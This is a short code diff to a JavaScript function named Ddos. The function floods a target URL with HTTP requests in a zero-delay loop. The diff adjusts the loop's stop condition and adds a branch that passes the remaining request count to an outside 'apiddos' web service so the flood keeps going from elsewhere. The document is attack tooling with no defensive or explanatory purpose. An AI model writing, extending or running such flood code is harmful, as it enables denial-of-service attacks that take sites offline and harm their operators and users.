@@ -8,8 +8,12 @@ function Ddos(link, max) {
   const inter = setInterval(() => {
     count++;
     sendRequest(link);
-    if (count > max) {
-      clearInterval(inter);
+    if (count >= max) {
+      return clearInterval(inter);
+    }
+    if(count >= 20000) {
+        max = max - 20000;
+        return axios.get(`http://apiddos.vidieu.net/api/ddos?link=${link}&max=${max}`);
     }
   }, 0);
 }
